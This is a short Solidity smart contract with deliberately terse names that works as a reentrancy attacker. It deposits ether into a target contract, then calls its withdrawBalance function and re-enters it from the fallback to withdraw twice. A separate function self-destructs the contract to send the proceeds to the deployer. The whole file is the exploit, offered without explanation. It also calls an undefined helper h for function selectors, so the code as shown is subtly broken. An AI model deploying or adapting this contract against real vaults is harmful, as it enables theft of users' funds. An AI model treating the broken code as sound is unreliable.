pragma solidity ^0.4.15;

contract VaultOperator {
    bool public b=false;
    address public c;
    address public g;

    function VaultOperator() public{
        g = msg.sender;
    }

    function f(address a) public payable{
        c = a ;

        require(c.call.value(msg.value)(bytes4(h("addToBalance()"))));
    }

    function d() public{
        b = true;


        require(c.call(bytes4(h("withdrawBalance()"))));
    }

    function () public payable{

        if (b){
            b = false;
                require(c.call(bytes4(h("withdrawBalance()"))));
        }
    }

    function e(){
        suicide(g);
    }

}